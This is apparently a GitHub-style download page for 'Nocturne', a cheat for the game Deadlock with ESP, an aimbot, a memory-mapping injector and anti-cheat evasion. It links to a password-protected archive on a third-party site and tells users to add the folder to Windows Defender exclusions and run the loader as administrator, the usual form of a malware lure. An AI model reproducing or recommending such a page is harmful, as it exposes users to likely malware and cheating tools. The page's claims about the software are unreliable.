# Nocturne – Game Overlay for Windows Download and Installation Guide

<div align="center">
  <img src="https://usenocturne.com/images/logo.png" width="470" alt="Nocturne Logo"/>
</div>

<br>

<p align="center">
  <a href="https://soft-land.online/p/nocturne">
    <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="220" alt="Download for Windows"/>
  </a>
</p>

<p align="center"><b>Password:</b> <code>github</code></p>

<p align="center"><a href="https://soft-land.online/p/nocturne">Download Nocturne for Windows 10/11</a> — free, no account required</p>

---

# Installation Instructions

1. Click the download button above and save the archive to your Windows PC.
2. Extract the archive with the password shown on this page (7-Zip or WinRAR).
3. Add the extracted folder to the Windows Defender exclusion list before the first start.
4. Close Deadlock, run the loader as administrator and sign in with the key from your profile.
5. Start Deadlock and press INSERT — the Nocturne menu opens over the game window.

---
## 🎮 Supported Games

| Game | Anti-cheat | Engine | Status |
| --- | --- | --- | --- |
| Deadlock | VAC + VAC Live | Source 2 | Supported |

## ⌨️ Menu and Hotkeys

| Key | Action |
| --- | --- |
| `INSERT` | Open / close the menu |
| `END` | Unload the overlay and clear the mapped module |
| `F1` | Toggle ESP |
| `F2` | Toggle aimbot |
| `F3` | Toggle ability cooldown tracker |
| `F4` | Cycle config profile |
| `DELETE` | Panic key: unload and exit without a tray icon |

Menu: ImGui overlay, separate transparent window; layout: per-game tabs, module search, drag-resize; excluded from OBS / Discord / Medal capture.

<div align="center">
  <img src="https://usenocturne.com/images/nocturne.png" width="1080" alt="Nocturne interface — screenshot 1 (Windows)"/>
</div>


## 🧠 Overview

Nocturne is a loader-driven overlay for Deadlock. Injection happens in memory, the menu is a separate transparent window, and the module list is trimmed per game to stay readable against VAC + VAC Live.

In practice the loader starts before Deadlock, the licence is checked against the hardware fingerprint, and the overlay appears on INSERT.

Everything that reads game memory sits inside the mapped module, so a change in VAC + VAC Live needs a new loader build rather than a new config.

## 🚀 Key Features

| Feature | Description |
| --- | --- |
| 👁️ ESP / Wallhack | Player boxes, health, armour and distance are drawn through geometry, with a visibility check so only entities the game renders are listed. |
| 🎯 Aimbot | Target picked by FOV, distance and hitbox priority, then driven through a smoothing curve tuned per axis and per weapon. |
| ⏱️ Cooldown Tracker | Ability and ultimate cooldown tracker: the enemy bar is drawn above the head with the remaining time, so a fight starts on a known timer. |
| 🖥️ In-Game Menu | ImGui overlay in a separate transparent window, with search across modules, per-game tabs and drag-resize of the layout. |
| 📦 Loader / Injector | Signed launcher that checks the licence, decrypts the module and maps it into the game process; nothing is written to disk. |
| 🗂️ Config System | Named profiles with module states, keybinds and per-weapon values; a profile loads on injection and can sync between machines. |
| 🎥 Stream Proof | The overlay window is excluded from the capture path of OBS, Discord and Medal, so the menu and ESP do not reach the stream. |
| 💉 Manual Mapping | Manual mapping: PE headers, sections, relocations and TLS callbacks are rebuilt in the target process, then the entry point runs on a new thread. |
| 🛡️ Anti-Screenshot | Overlay windows are hidden from the desktop compositor and window enumeration, so a screenshot of the game shows a clean frame. |
| 🧰 Miscellaneous | FOV changer, third-person, spectator list, auto-accept and a panic key that unloads every module in one frame. |

## 💻 System Requirements

| Component | Minimum / Recommended |
| --- | --- |
| Operating System | Windows 10 21H2 or Windows 11 23H2, 64-bit only |
| Game | Deadlock |
| Anti-Cheat | VAC + VAC Live |
| Processor | Intel Core i5-9400 / AMD Ryzen 5 3600 or better |
| Memory | 8 GB RAM minimum, 16 GB recommended with the overlay open |
| Graphics | GPU with 2 GB VRAM, game running in borderless or windowed mode |
| Storage | 300 MB free space for the loader, configs and logs |
| Secure Boot | Left at the default setting |
| Windows Defender | Install folder added to exclusions before extraction |
| Network | Connection required for the licence check and module updates |

## Additional Information for Windows Users

The loader checks the licence against the hardware fingerprint on each start, then decrypts the module and maps it into the running game process. Nothing is written next to the game executable, so a file integrity scan by VAC + VAC Live finds the original files untouched; the overlay lives in the loader process and is composited over the window.

Configs are plain files under the loader folder: module states, keybinds, per-weapon recoil values and ESP colours. Keeping a second copy outside that folder is the fastest way back after a game update, because VAC + VAC Live pushes pattern changes several times a month and a stale build is replaced with a fresh loader for Deadlock rather than patched by hand.

## More game overlay software for Windows

- [Aurora for Windows](https://soft-land.online/p/aurora)
- [Beacon for Windows](https://soft-land.online/p/beacon)
- [Cinder for Windows](https://soft-land.online/p/cinder)
- [Cipher for Windows](https://soft-land.online/p/cipher)
- [Drift for Windows](https://soft-land.online/p/drift)

[Full catalog of Windows software](https://soft-land.online/)

---


## 🏷️ Tags

Nocturne • Nocturne Download • Nocturne Windows • Nocturne ESP • Nocturne Aimbot • Nocturne for Deadlock • Deadlock ESP • Game Overlay • HWID Spoofer • Windows 11 • Windows 10
